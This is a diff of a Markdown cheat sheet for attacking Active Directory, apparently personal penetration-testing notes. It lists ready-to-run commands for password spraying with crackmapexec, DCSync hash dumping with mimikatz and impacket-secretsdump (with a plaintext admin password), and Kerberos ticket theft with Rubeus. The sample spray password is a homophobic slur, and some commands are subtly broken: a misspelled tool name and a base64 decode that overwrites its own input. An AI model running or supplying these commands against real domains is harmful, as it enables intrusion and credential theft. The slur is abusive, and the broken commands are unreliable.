@@ -22,7 +22,7 @@
     - DomainPasswordSpray: https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1 #NoFullAutoInTheBuilding! 🔫🔫🔫🔫🔫🔫
 2. SMB (Nois & slow)
     - Run in Kali Env
-    - ``` crackmapexec smb {victim ip} -u users.txt -p 'YouAreFuckingGay' -d corp.com (--continue-on-success OR --shares) ``` 
+    - ``` crackmapexec smb {victim ip} -u users.txt -p 'YouAreFuckingGay' -d corp.com (--continue-on-success OR --shares OR --users) ``` 
     - ``` -pass-pol ``` check password policy (before brute force)
     - If have local admin rights of that ac will show "Pwd3d!"
 3. Kerberos TGT
@@ -103,4 +103,16 @@
   2. Obtain any user credentials(hashed) ``` lsadump::dcsync /user:corp\dave ```
 - Linux (Kali way)
 1. ``` impacket-secretsdump -just-dc-user {target user to get} corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@{dc_ip} ```
+2. Another way (maybe care about datetime)
+    ``` 
+    export KRB5CCNAME=ticket.ccache
+    impacket-secretdump -k -no-pass {domain name}
+    ```
 
+# Generate TGT
+## Rubeus tgtdeleg
+- ``` .\rubeus.exe tgtdeleg /nowrap ```
+- decode the kirbi with base 64 ``` cat {ticket.kirbi} | base64 -d > {ticket.kirbi} ```
+
+# Convert kirbi to ccache
+- ``` kirbi2ccache {xx.kirbi} {xx.ccache} ```
